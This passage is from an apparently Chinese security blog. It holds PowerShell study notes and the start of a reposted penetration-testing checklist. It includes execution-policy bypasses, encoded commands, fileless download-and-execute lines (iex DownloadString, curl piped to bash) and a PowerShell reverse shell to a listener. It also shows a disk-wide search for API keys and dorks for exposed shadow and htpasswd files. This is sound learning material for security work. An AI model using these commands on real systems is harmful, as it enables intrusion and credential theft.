<h4 id="2-使用base64编码绕过"><a href="#2-使用base64编码绕过" class="headerlink" title="2.使用base64编码绕过"></a>2.使用base64编码绕过</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=[<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">"Write-Host 'Wzxc123444' "</span>)</span><br><span class="line"><span class="variable">$b</span>=[<span class="type">Convert</span>]::ToBase64String(<span class="variable">$a</span>)</span><br><span class="line">powershell <span class="literal">-enc</span> <span class="variable">$b</span></span><br></pre></td></tr></table></figure>

<h4 id="3-读取文件内容然后通过管道符执行"><a href="#3-读取文件内容然后通过管道符执行" class="headerlink" title="3.读取文件内容然后通过管道符执行"></a>3.读取文件内容然后通过管道符执行</h4><p>这种就类似于Linux的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'whoami'</span> &gt; 1.txt</span><br><span class="line">cat 1.txt | bash</span><br></pre></td></tr></table></figure>



<p>在powershell中则：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> ./file_name | PowerShell.exe <span class="literal">-noprofile</span> -</span><br></pre></td></tr></table></figure>



<h4 id="4-通过网络下载，但是不写入磁盘执行-无文件落地"><a href="#4-通过网络下载，但是不写入磁盘执行-无文件落地" class="headerlink" title="4.通过网络下载，但是不写入磁盘执行(无文件落地)"></a>4.通过网络下载，但是不写入磁盘执行(无文件落地)</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-NoProfile</span> <span class="literal">-Command</span> “iex ((<span class="built_in">new-object</span> net.webclient).DownloadString(<span class="string">'http://192.168.133.1/runme.ps1'</span>))<span class="string">"</span></span><br></pre></td></tr></table></figure>

<p>这个和Linux以下命令相似</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L http://127.0.0.1:8080/runme.sh|bash</span><br><span class="line">wget http://127.0.0.1:8080/runme.sh -O - | bash</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(wget http://127.0.0.1:8080/runme.sh -O -)</span>"</span></span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -L http://127.0.0.1:8080/runme.sh)</span>"</span></span><br></pre></td></tr></table></figure>



<h4 id="5-直接用-command参数"><a href="#5-直接用-command参数" class="headerlink" title="5.直接用-command参数"></a>5.直接用-command参数</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-command</span> <span class="string">"Write-Host 'llll'"</span></span><br></pre></td></tr></table></figure>

<p>这与Linux中的以下命令相似</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">'echo "lll"'</span></span><br><span class="line">sh -c ....</span><br></pre></td></tr></table></figure>

<h4 id="6-Invoke-Command"><a href="#6-Invoke-Command" class="headerlink" title="6.Invoke-Command"></a>6.Invoke-Command</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">invoke-command</span> <span class="literal">-scriptblock</span> &#123;<span class="built_in">Write-Host</span> <span class="string">"My voice is my passport, verify me."</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7-iex"><a href="#7-iex" class="headerlink" title="7. iex"></a>7. iex</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> .\runme.ps1 | <span class="built_in">Invoke-Expression</span> </span><br><span class="line"><span class="comment"># 简写</span></span><br><span class="line">Gc .\runme.ps1 |iex</span><br></pre></td></tr></table></figure>

<h4 id="8-Bypass绕过"><a href="#8-Bypass绕过" class="headerlink" title="8.Bypass绕过"></a>8.Bypass绕过</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200901194522762.png" alt="image-20200901194522762"></p>
<h4 id="9-Unrestricted"><a href="#9-Unrestricted" class="headerlink" title="9.Unrestricted"></a>9.Unrestricted</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> UnRestricted <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>

<h4 id="10-Remotesigned"><a href="#10-Remotesigned" class="headerlink" title="10.Remotesigned"></a>10.Remotesigned</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Remotesigned <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>

<h4 id="11-临时修改变量"><a href="#11-临时修改变量" class="headerlink" title="11.临时修改变量"></a>11.临时修改变量</h4><p>临时更改配置为允许。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>

<p>和上面的区别在于，这个是通过修改注册表将当前用户环境的设置应用到当前用户的环境中。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Executionpolicy</span> <span class="literal">-Scope</span> CurrentUser <span class="literal">-ExecutionPolicy</span> UnRestricted</span><br></pre></td></tr></table></figure>



<h2 id="关于渗透"><a href="#关于渗透" class="headerlink" title="关于渗透"></a>关于渗透</h2><h3 id="比较重要的命令"><a href="#比较重要的命令" class="headerlink" title="比较重要的命令"></a>比较重要的命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="literal">-ExecutionPolicyBypass</span> //直接绕过powershell本地脚本执行策略限制 </span><br><span class="line"><span class="literal">-ep</span> bypass</span><br><span class="line"><span class="literal">-NoLogo</span> //启动时隐藏版权标志</span><br><span class="line"><span class="literal">-NonInteractive</span>  //脚本以非交互模式运行</span><br><span class="line"><span class="literal">-NoProfile</span>  //文件不落地，直接放在内存中</span><br><span class="line"><span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> //隐藏窗口运行</span><br><span class="line"><span class="literal">-EncodedCommand</span> //接受命令的 Base <span class="number">64</span> 编码字符串版本</span><br><span class="line"><span class="literal">-enc</span></span><br><span class="line"><span class="operator">-File</span> xxx.ps1 //指定本地运行的脚本路径</span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="powershell-反弹shell"><a href="#powershell-反弹shell" class="headerlink" title="powershell 反弹shell"></a>powershell 反弹shell</h4><p>Kali执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p>受害者执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">. .\<span class="built_in">Invoke-PowerShellTcp</span>.ps1 <span class="comment"># 引用这个脚本代码</span></span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">56.2</span> <span class="literal">-Port</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure>



<h2 id="关于补全"><a href="#关于补全" class="headerlink" title="关于补全"></a>关于补全</h2><p>powershell也会自动补全，不过只会补全</p>
<ol>
<li>powershell命令名，（含cmd命令，第三方命令）</li>
<li>系统文件名，</li>
<li>powershell参数名，</li>
<li>你自己编写的powershell脚本的参数名，100%可以补全。</li>
<li>powershell方法名，</li>
<li>powershell属性名，</li>
</ol>
<blockquote>
<p>都可以存在中文</p>
</blockquote>
<h2 id="Get-ChildItem"><a href="#Get-ChildItem" class="headerlink" title="Get-ChildItem"></a>Get-ChildItem</h2><p>Get-ChildItem 类似dir命令，不过ls也可以。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\aaa&gt; (<span class="built_in">Get-Command</span> <span class="built_in">Get-ChildItem</span>).Parameters</span><br><span class="line"></span><br><span class="line">Key                 Value                                         </span><br><span class="line">---                 -----                                         </span><br><span class="line">Path                System.Management.Automation.ParameterMetadata 指定路径</span><br><span class="line">LiteralPath         System.Management.Automation.ParameterMetadata 原始字符串路径 类似python的r<span class="string">"strs"</span></span><br><span class="line"><span class="keyword">Filter</span>              System.Management.Automation.ParameterMetadata</span><br><span class="line">Include             System.Management.Automation.ParameterMetadata 包括?</span><br><span class="line">Exclude             System.Management.Automation.ParameterMetadata</span><br><span class="line">Recurse             System.Management.Automation.ParameterMetadata 子目录</span><br><span class="line">Depth               System.Management.Automation.ParameterMetadata 深度？</span><br><span class="line">Force               System.Management.Automation.ParameterMetadata </span><br><span class="line">Name                System.Management.Automation.ParameterMetadata 文件名</span><br><span class="line">Verbose             System.Management.Automation.ParameterMetadata 详细信息</span><br><span class="line">Debug               System.Management.Automation.ParameterMetadata</span><br><span class="line">ErrorAction         System.Management.Automation.ParameterMetadata</span><br><span class="line">WarningAction       System.Management.Automation.ParameterMetadata</span><br><span class="line">InformationAction   System.Management.Automation.ParameterMetadata</span><br><span class="line">ErrorVariable       System.Management.Automation.ParameterMetadata</span><br><span class="line">WarningVariable     System.Management.Automation.ParameterMetadata</span><br><span class="line">InformationVariable System.Management.Automation.ParameterMetadata</span><br><span class="line">OutVariable         System.Management.Automation.ParameterMetadata</span><br><span class="line">OutBuffer           System.Management.Automation.ParameterMetadata</span><br><span class="line">PipelineVariable    System.Management.Automation.ParameterMetadata</span><br><span class="line">UseTransaction      System.Management.Automation.ParameterMetadata</span><br><span class="line">Attributes          System.Management.Automation.ParameterMetadata</span><br><span class="line">Directory           System.Management.Automation.ParameterMetadata  过滤，只输出目录</span><br><span class="line">File                System.Management.Automation.ParameterMetadata  过滤，只输出文件</span><br><span class="line"><span class="keyword">Hidden</span>              System.Management.Automation.ParameterMetadata  过滤，只输出隐藏文件</span><br><span class="line">ReadOnly            System.Management.Automation.ParameterMetadata  过滤，只输出只读文件</span><br><span class="line">System              System.Management.Automation.ParameterMetadata</span><br><span class="line"><span class="literal">-ErrorAction</span> SilentlyContinue 忽略错误</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> D:/</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">一些目录信息</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Include</span> *interesting<span class="operator">-file</span>.txt* <span class="operator">-File</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="comment">#模糊查找interesting-file.txt文件，并且忽略报错</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> C:\* <span class="literal">-Recurse</span> | <span class="built_in">Select-String</span> <span class="literal">-pattern</span> API_KEY <span class="comment">#搜索所有文件，文件内容包含api_key的文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Attributes</span> h <span class="comment">#列出所有隐藏文件</span></span><br></pre></td></tr></table></figure>

<h2 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h2><figure class="highlight powershell"><figcaption><span>一些文件的操作</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;变量名&#125;=dir 一个文件路径</span><br><span class="line"><span class="variable">$a</span>=dir D:\test.txt</span><br><span class="line"><span class="variable">$a</span>.FullName</span><br><span class="line"><span class="variable">$a</span>.FullName   <span class="comment">#全路径属性</span></span><br><span class="line"><span class="variable">$a</span>.name				<span class="comment">#文件名和扩展名</span></span><br><span class="line"><span class="variable">$a</span>.BaseName   <span class="comment">#文件名</span></span><br><span class="line"><span class="variable">$a</span>.Extension  <span class="comment">#扩展名</span></span><br><span class="line"><span class="variable">$a</span>.LastWriteTime <span class="comment">#返回最后写入时间属性</span></span><br><span class="line"><span class="variable">$a</span>.Length		<span class="comment">#文件字节长度</span></span><br><span class="line"><span class="variable">$a</span>.DirectoryName <span class="comment">#父目录</span></span><br><span class="line"></span><br><span class="line">测试文件目录是否存在（返回一个布尔值</span><br><span class="line"><span class="built_in">Test-Path</span> D:\test.txt</span><br><span class="line">True</span><br><span class="line"><span class="built_in">Test-Path</span> D:\test.exe</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"><span class="built_in">Test-Path</span> D:\test\</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line"><span class="built_in">test-path</span> C:\xxx\yyy  <span class="literal">-pathtype</span> Container  <span class="comment">#测试是否有此目录</span></span><br><span class="line"><span class="built_in">test-path</span> C:\xxx\yyy  <span class="literal">-pathtype</span> Leaf  <span class="comment">#测试是否有此文件</span></span><br><span class="line"></span><br><span class="line">powershell脚本中拆分文件名和路径</span><br><span class="line"><span class="built_in">Split-Path</span> <span class="literal">-Path</span> <span class="string">"C:\Test\Logs\*.log"</span> <span class="literal">-Leaf</span> <span class="literal">-Resolve</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#返回所有文件名即</span></span><br><span class="line"><span class="comment">#Pass1.log</span></span><br><span class="line"><span class="comment">#Pass2.log</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Split-Path</span> <span class="literal">-Path</span> <span class="string">"C:\Test\Logs\*.log"</span> </span><br><span class="line"><span class="comment">#返回目录：C:\Test\Logs\</span></span><br><span class="line"></span><br><span class="line">powershell脚本中合并目录，文件</span><br><span class="line"><span class="variable">$</span>目录名= <span class="string">'/root'</span></span><br><span class="line"><span class="variable">$</span>目录名加文件名 = <span class="string">"<span class="variable">$</span>目录名/abc/def.txt"</span></span><br><span class="line"><span class="comment">#返回/root/abc/def.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="Get-Content"><a href="#Get-Content" class="headerlink" title="Get-Content"></a>Get-Content</h2><figure class="highlight powershell"><figcaption><span>Get-Content参数 (这里补充get-content的parameters)</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><figcaption><span>Get-Content基本用法</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> D:\test.txt <span class="comment">#获取test的文件内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Content</span> D:\test.txt <span class="literal">-ReadCount</span> <span class="number">0</span> <span class="comment">#将文件分行放到一个数组中</span></span><br><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Content</span> D:\test.txt <span class="literal">-raw</span> <span class="comment">#将一个文件作为大字符串，存入一个变量</span></span><br></pre></td></tr></table></figure>

<h2 id="Get-Location"><a href="#Get-Location" class="headerlink" title="Get-Location"></a>Get-Location</h2><p>获取当前路径</p>
<h2 id="Select-Object"><a href="#Select-Object" class="headerlink" title="Select-Object"></a>Select-Object</h2><p>选择指定字段列出信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Mode,Name <span class="comment">#只列出权限位和文件名信息</span></span><br></pre></td></tr></table></figure>

<p>其他的一些参数</p>
<ul>
<li>first 开头的第x个对象 （head</li>
<li>last 结尾的第x个对象（tail</li>
<li>unique 集合</li>
<li>skip 跳过x个对象</li>
</ul>
<h2 id="Where-Object"><a href="#Where-Object" class="headerlink" title="Where-Object"></a>Where-Object</h2><p>在搜索时匹配指定的字符串（grep?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-Service | Where-Object -Property Status -eq Stopped # 匹配状态处于关闭的服务</span><br></pre></td></tr></table></figure>


<h2 id="measure"><a href="#measure" class="headerlink" title="measure"></a>measure</h2><p>统计命令，类似于wc</p>
<figure class="highlight powershell"><figcaption><span>统计系统中已经安装命令的总数</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> | measure</span><br></pre></td></tr></table></figure>

<h2 id="Get-Counter"><a href="#Get-Counter" class="headerlink" title="Get-Counter"></a>Get-Counter</h2><p>powershell的性能监视器</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Counter</span> <span class="literal">-ListSet</span> * | <span class="built_in">Sort-Object</span> CounterSetName | <span class="built_in">Format-Table</span> CounterSetName <span class="comment">#查看所有性能分类</span></span><br><span class="line">(<span class="built_in">Get-Counter</span> <span class="literal">-ListSet</span> PhysicalDisk).Paths <span class="comment">#查看某一大类下的小类</span></span><br></pre></td></tr></table></figure>

<h2 id="Get-Server"><a href="#Get-Server" class="headerlink" title="Get-Server"></a>Get-Server</h2><h2 id="Get-Scheduled"><a href="#Get-Scheduled" class="headerlink" title="Get-Scheduled"></a>Get-Scheduled</h2><h2 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h2><p>向web服务器发请求的命令</p>
<figure class="highlight powershell"><figcaption><span>Invoke-WebRequest参数列表</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="服务器信息枚举"><a href="#服务器信息枚举" class="headerlink" title="服务器信息枚举"></a>服务器信息枚举</h2><h3 id="Get-LocalUser"><a href="#Get-LocalUser" class="headerlink" title="Get-LocalUser"></a>Get-LocalUser</h3><p>获取本机的用户</p>
<h3 id="Get-LocalGroup"><a href="#Get-LocalGroup" class="headerlink" title="Get-LocalGroup"></a>Get-LocalGroup</h3><p>获取本机组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-LocalGroup | measure # 获取组并统计数量</span><br></pre></td></tr></table></figure>

<h3 id="Get-Hotfix"><a href="#Get-Hotfix" class="headerlink" title="Get-Hotfix"></a>Get-Hotfix</h3><p>获取已经打了什么补丁</p>
<h3 id="获取进程信息-Get-Process"><a href="#获取进程信息-Get-Process" class="headerlink" title="获取进程信息 Get-Process"></a>获取进程信息 Get-Process</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-Process</span><br></pre></td></tr></table></figure>

<h3 id="获取工作排程-Get-ScheduleTask"><a href="#获取工作排程-Get-ScheduleTask" class="headerlink" title="获取工作排程 Get-ScheduleTask"></a>获取工作排程 Get-ScheduleTask</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ScheduleTask</span><br></pre></td></tr></table></figure>

<h3 id="获取指定文件-路径的所有者信息"><a href="#获取指定文件-路径的所有者信息" class="headerlink" title="获取指定文件/路径的所有者信息"></a>获取指定文件/路径的所有者信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-Acl</span><br></pre></td></tr></table></figure>

<h2 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h2><h3 id="Get-NetIPAddress"><a href="#Get-NetIPAddress" class="headerlink" title="Get-NetIPAddress"></a>Get-NetIPAddress</h3><p>获取本机IP信息</p>
<h2 id="Get-NetTCPConnection"><a href="#Get-NetTCPConnection" class="headerlink" title="Get-NetTCPConnection"></a>Get-NetTCPConnection</h2><p>获取已经开启的tcp端口状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GEt-NetTCPConnection | Where-Object -Property State -Match Listen</span><br></pre></td></tr></table></figure>

<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_his</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Penetration-Test-Steps</title>
    <url>/2020/04/16/Penetration-Test-Steps/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="渗透测试步骤们"><a href="#渗透测试步骤们" class="headerlink" title="渗透测试步骤们"></a>渗透测试步骤们</h1><p>整理硬盘的时候，发现TG download的文件目录下有这文章。<br>已经忘记是哪位大佬发的了，这里发到博客上面备份下。</p>
<p>赞美大佬（<br><img src="https://images.atsud0.me/images/post/Screenshot_20200416_141813.jpg" alt="喵"></p>
<p><a href="https://gitbook.se7ensec.cn/" target="_blank" rel="noopener">https://gitbook.se7ensec.cn/</a></p>
<a id="more"></a>


<ul>
<li>Reconnaissance（侦察）<ul>
<li>Passive/Semi-Passive（被动/半被动信息收集）<ul>
<li>Third Party Resources（第三方资源们）<ul>
<li>Locate Target Range<ul>
<li>ARIN - <a href="https://www.arin.net/" target="_blank" rel="noopener">https://www.arin.net/</a></li>
</ul>
</li>
<li>Fingerprint Domain/Website（收集域名/网站指纹）<ul>
<li>Shodan - <a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
<li>Censys - <a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a></li>
<li>Zoomeye - <a href="https://www.zoomeye.org" target="_blank" rel="noopener">https://www.zoomeye.org</a></li>
<li>Netcraft - <a href="https://www.netcraft.com/" target="_blank" rel="noopener">https://www.netcraft.com/</a></li>
<li>Extended Network Information（加强版网络信息）<ul>
<li>Central Ops - <a href="https://centralops.net/co/DomainDossier.aspx" target="_blank" rel="noopener">https://centralops.net/co/DomainDossier.aspx</a></li>
<li>Robtex - <a href="https://www.robtex.net/" target="_blank" rel="noopener">https://www.robtex.net/</a></li>
</ul>
</li>
<li>Metasploit Scanning（Metasploit扫描）<ul>
<li>auxiliary/scanner/*<ul>
<li>portscan/tcp</li>
<li>http/http_version</li>
<li>http/tomcat_enum</li>
<li>http/trace_axd<ul>
<li>Google - site:<result from above> filetype:axd OR inurl:trace.axd</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Command Line Recon（命令行侦察）<ul>
<li>Network Information （网络信息）<ul>
<li>nslookup <target><ul>
<li>DNS cache snooping</li>
</ul>
</li>
<li>dig <target></li>
</ul>
</li>
<li>Security Mechanisms （安全机制）<ul>
<li>halberd</li>
</ul>
</li>
<li>Metadata（元数据）<ul>
<li>exiftool</li>
<li>strings<ul>
<li>strings -e b (big endian) OR -e l (little endian)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>People Search（搜人）<ul>
<li>Yahoo People Search - <a href="http://itools.com/tool/yahoo-people-search" target="_blank" rel="noopener">http://itools.com/tool/yahoo-people-search</a></li>
<li>Switchboard - <a href="http://www.switchboard.com/person" target="_blank" rel="noopener">http://www.switchboard.com/person</a></li>
<li>Google Finance - <a href="https://www.google.com/finance" target="_blank" rel="noopener">https://www.google.com/finance</a></li>
<li>Zaba - <a href="http://www.zabasearch.com/" target="_blank" rel="noopener">http://www.zabasearch.com/</a></li>
</ul>
</li>
</ul>
</li>
<li>Active（主动信息收集）<ul>
<li>Command Line Recon Tools（命令行侦察工具们）<ul>
<li>General Recon（通用侦察手段）<ul>
<li>Recon-NG<ul>
<li>Automated with <a href="https://github.com/jhaddix/domain" target="_blank" rel="noopener">https://github.com/jhaddix/domain</a></li>
</ul>
</li>
<li>Domain/Subdomain Information（域名/子域名信息）<ul>
<li>Fierce</li>
<li>The Harvester</li>
<li>Dirb</li>
<li>Dirbuster</li>
</ul>
</li>
</ul>
</li>
<li>Nmap<ul>
<li>nmap -Pn -sSU -sV –top-ports 20 <target></li>
</ul>
</li>
<li>Create Custom Worldlist（建立自定义字典）<ul>
<li>cewl - <a href="https://digi.ninja/projects/cewl.php" target="_blank" rel="noopener">https://digi.ninja/projects/cewl.php</a></li>
<li>wget - <a href="http://wiki.securityweekly.com/wiki/index.php/Episode129" target="_blank" rel="noopener">http://wiki.securityweekly.com/wiki/index.php/Episode129</a></li>
</ul>
</li>
</ul>
</li>
<li>Software（软件们）<ul>
<li>FOCA</li>
<li>SPARTA</li>
<li>Maltego</li>
<li>Dirbuster</li>
</ul>
</li>
</ul>
</li>
<li>Browser Extensions（浏览器插件们）<ul>
<li>Chrome</li>
<li>Firefox</li>
<li>Safari</li>
</ul>
</li>
<li>Google Searching（Google高级搜索）<ul>
<li>site:”target name” jobs,careers,openings,etc</li>
<li>intitle:”index of <Keyword>“<ul>
<li>Keyword<ul>
<li>.bash_history</li>
<li>etc/shadow</li>
<li>finances.xls(x)</li>
<li>htpasswd</li>
<li>inurl:maillog</li>
</ul>
</li>
</ul>
</li>
<li>site:<em>.edu filetype:</em>.bak OR <keyword><ul>
<li>Keyword<ul>
<li>*.conf</li>
<li>*.backup</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Enumeration（信息枚举）<ul>
<li>Internal（内部网络）<ul>
<li>Scanning（扫描）<ul>
<li>Map Internal Network（建立内网拓扑）<ul>
<li>Command Line Tools（命令行工具们）<ul>
<li>arp -a</li>
<li>ip neigh show</li>
<li>smbtree -NS 2&gt;/dev/null</li>
<li>nbtscan -r <current_IPrange></li>
<li>netdiscover -r <current_IPrange></li>
<li>nmap -n -Pn -T5 -sS <current_IPrange><ul>
<li>nmap NSE scripts<ul>
<li>NFS</li>
<li>SMB</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Pivoting（跳板/转发）<ul>
<li>SSH Proxy Tunneling with Proxychain<ul>
<li><a href="http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html" target="_blank" rel="noopener">http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>External（外部网络）<ul>
<li>Scanning（扫描）<ul>
<li>Nmap</li>
<li>Unicornscan</li>
<li>OneTwoPunch<ul>
<li>Combines nmap and unicorn scan <a href="https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh" target="_blank" rel="noopener">https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Exploitation（漏洞利用）<ul>
<li>External（外部网络）<ul>
<li>Web Vulnerability Scanners（Web漏洞扫描器们）<ul>
<li>Burp<ul>
<li><a href="https://portswigger.net/burp/" target="_blank" rel="noopener">https://portswigger.net/burp/</a></li>
<li>My Guide: <a href="http://pastebin.com/nNHYP9Jd" target="_blank" rel="noopener">http://pastebin.com/nNHYP9Jd</a></li>
</ul>
</li>
<li>Wapiti<ul>
<li><a href="http://wapiti.sourceforge.net/" target="_blank" rel="noopener">http://wapiti.sourceforge.net/</a></li>
</ul>
</li>
<li>w3af<ul>
<li><a href="http://w3af.org/" target="_blank" rel="noopener">http://w3af.org/</a></li>
</ul>
</li>
<li>Nikto<ul>
<li><a href="https://cirt.net/Nikto2" target="_blank" rel="noopener">https://cirt.net/Nikto2</a></li>
</ul>
</li>
</ul>
</li>
<li>Framework（框架）<ul>
<li>web2attack<ul>
<li><a href="https://github.com/santatic/web2attack" target="_blank" rel="noopener">https://github.com/santatic/web2attack</a></li>
</ul>
</li>
</ul>
</li>
<li>Command Line Tools（命令行工具们）<ul>
<li>CMSmap<ul>
<li><a href="https://github.com/Dionach/CMSmap" target="_blank" rel="noopener">https://github.com/Dionach/CMSmap</a></li>
</ul>
</li>
<li>WPscan<ul>
<li><a href="https://wpscan.org/" target="_blank" rel="noopener">https://wpscan.org/</a></li>
</ul>
</li>
<li>Joomscan<ul>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project" target="_blank" rel="noopener">https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Internal（内部网络）<ul>
<li>LAN Attacks（LAN攻击）<ul>
<li>Local Python Server -<ul>
<li>Serve Shells/Exploits（建立Shell和Exploits下载站）<ul>
<li>python -m SimpleHTTPServer <port></li>
<li>python3 -m http.server <port></li>
<li>php -S <host>:<port></li>
</ul>
</li>
<li>LLMNR/NBT-NS Poisoning（LLMNR/NBT-NS投毒）<ul>
<li>Responder - <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a><ul>
<li>Listen/respond to LLMNR NBTNS requests</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Local Vulnerability Scanning（本地漏洞扫描）<ul>
<li>LinEnum- <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></li>
<li>Unix-privesc-check</li>
<li>Linux_Exploit_Suggester</li>
</ul>
</li>
<li>Comprehensive Linux Enumeration（详细，全面的Linux枚举）<ul>
<li><a href="http://www.rebootuser.com/?p=1623" target="_blank" rel="noopener">http://www.rebootuser.com/?p=1623</a></li>
</ul>
</li>
<li>Bypass AV（反病毒软件绕过）<ul>
<li>PowerSploit - Python Powershell Shell<ul>
<li><a href="https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/" target="_blank" rel="noopener">https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/</a></li>
</ul>
</li>
<li>Download Files via Command Line（通过命令行下载文件）<ul>
<li><a href="https://www.greyhathacker.net/?p=500" target="_blank" rel="noopener">https://www.greyhathacker.net/?p=500</a></li>
</ul>
</li>
</ul>
</li>
<li>Reverse Shells（反向Shell）<ul>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
